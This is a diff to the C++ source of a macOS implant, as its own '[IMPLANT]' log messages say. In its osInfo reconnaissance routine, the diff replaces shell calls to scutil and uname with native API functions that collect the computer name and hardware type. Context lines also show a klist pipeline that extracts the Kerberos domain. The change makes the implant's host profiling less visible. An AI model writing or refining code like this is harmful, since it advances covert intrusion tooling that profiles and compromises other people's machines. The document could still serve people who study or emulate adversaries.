@@ -89,6 +89,26 @@ namespace client {
             return -1;
         }
     }
+
+    std::string getComputerName() {
+        char buffer[64] = {0};
+        CFStringRef cf = SCDynamicStoreCopyComputerName(NULL, NULL);
+        if (cf != NULL) {
+            CFStringGetCString(cf, buffer, 64, kCFStringEncodingUTF8);
+            return buffer;
+        }
+        std::cout << "[IMPLANT] Error: cannot retrieve computer name" << std::endl;
+        return "";
+    }
+
+    std::string getHardwareName() {
+        struct utsname buffer;
+        if (uname(&buffer) < 0) {
+            std::cout << "[IMPLANT] Error: cannot retrieve hardware name" << std::endl;
+            return "";
+        }
+        return buffer.machine;
+    }
 }
 
 bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
@@ -121,10 +141,10 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
         os_info += username + "\n";
 
         // scutil --get ComputerName
-        os_info += client::executeCmd("scutil --get ComputerName");
+        os_info += client::getComputerName() + "\n";
 
         // uname -m
-        os_info += client::executeCmd("uname -m");
+        os_info += client::getHardwareName() + "\n";
 
         // get domain name
         c->domain = client::executeCmd("klist 2>/dev/null | awk '/Principal/ {split($0,line,\"@\"); printf(\"%s\", line[2])}'");
